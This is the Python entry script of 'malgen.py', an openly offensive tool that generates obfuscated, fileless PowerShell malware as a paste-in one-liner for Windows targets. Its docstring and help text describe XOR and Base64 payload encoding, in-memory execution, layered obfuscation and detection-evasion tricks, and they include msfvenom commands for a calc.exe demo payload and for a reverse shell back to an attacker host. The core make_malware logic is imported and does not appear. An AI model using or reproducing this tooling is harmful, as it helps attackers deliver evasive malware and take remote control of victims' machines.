#!/usr/bin/env python3

"""
malgen.py
=========
This script utilizes modern-day PowerShell fileless malware techniques, along
with PowerShell obfuscation techniques, to create a PowerShell 'one-liner'
which can be used to launch a custom payload against a Windows target, simply
by pasting a command into a command prompt.

The payload must be generated for 32-bit Windows.

Demo payload: msfvenom -p windows/exec CMD=calc.exe -f raw -o test.bin
Reverse Shell:

  msfvenom -p windows/shell_reverse_tcp -f raw LHOST=IP LPORT=6666 -o bad.bin

How it Works
------------
1. The specified binary payload is XOR encrypted and Base64-encoded.
2. The Base64 payload is injected into `executor.ps1`.
    * This script decodes, decrypts, and executes the payload in-memory.
3. The `executor.ps1` script is obfuscated.
4. The resulting Base64 is injected into `inner_wrap.ps1`.
    * This script determines the processor architecture, then executes the
      payload accordingly (if possible).
5. The `inner_wrap.ps1` script is obfuscated, then stuffed into the
   `outer_wrap.ps1` script.
    * This script simply executes the script stuffed within it.
6. The final payload is Base64-encoded and formatted for use in the cmd.exe or
   powershell.exe command line.
7. The result is saved into the specified output file.

To execute the payload on a target, just copy the contents of the output file
and paste them into a cmd.exe or powershell.exe command-line interface.

Code Formatting
---------------
The obfuscation feature assumes the following about the way the PowerShell
source code is formatted prior to obfuscation:

* Variables are all formatted as `$variable_name`, and may contain letters,
  numbers, and underscores. Case doesn't matter.
* Variable assignments are standardized as `$var = value;`. There must be
  one space before and after the `=` sign, and the value is assumed to be
  everything preceding the `;`. Also, it should all be on one line.
* Functions are declared as `function FuncName {};` with a single space
  between `function`, the name of the function, and the opening bracket.
* Strings are declared with `'` single-quotes, not double-quotes.
* Param() definitions within functions should be on their own line.

Obfuscation Techniques
----------------------
Prior to automated obfuscation, the following techniques can help to obfuscate
your code further (though it's important to test with every change, as some of
these techniques do not work in all cases).

* [AppDomain]::CurrentDomain.GetAssemblies() can be obfuscated as:
    * ([type]('AppDomain'))::'currentdomain'.('getassemblies').invoke()
* Many `[XYZ]` declarations can be stored to a variable like so:
    * $unsignedint32 = ([type]('UInt32'));
    * Which can be plugged in anywhere you see `[UInt32]`.
    * Alternatively, you can simply change them to `([type]('XYZ'))` in-place.
* Careful! These changes don't always work in all cases.

TODO
----
* Reduce quoted block division to a sane amount without sacrificing size.
* Figure out why variable obfuscation doesn't work.
* Enable 64-bit payloads by checking platform compatibility.

"""

import argparse, sys, textwrap

from resources.mg_func import make_malware

parser = argparse.ArgumentParser(
    formatter_class=argparse.RawDescriptionHelpFormatter,
    description="Craft obfuscated, fileless PowerShell malware.",
    epilog=textwrap.dedent('''\
        Details
        -------
        * The output file will contain a command to be copied and pasted into
          a Windows cmd.exe or powershell.exe command line.
        * Using the `-e` option will Base64-encode the command being passed,
          but will use fewer obfuscation methods. It also results in a larger
          payload length.

        Crafting Binary Payloads
        ------------------------
        * Binary payloads should be targeted at 32-bit Windows systems. This
          ensures they will run on both 32- and 64-bit systems.
        * Payloads can be crafted with `msfvenom`. Here's a PoC example:

            msfvenom -p windows/exec CMD=calc.exe -f raw -o PoC.bin

        ~malgen.py by @haxys2~
    ''')
)
parser.add_argument(
    '-e', '--encode', action='store_const', default=False, const=True,
    help="Base64-encode output"
)
parser.add_argument(
    'payload', help='Raw-formatted 32-bit binary payload'
)
parser.add_argument(
    'output', help='Output file path'
)

args = parser.parse_args()

with open(args.output, "w") as outfile:
    outfile.write(make_malware(args.payload, args.encode))
print(f"Script saved!")
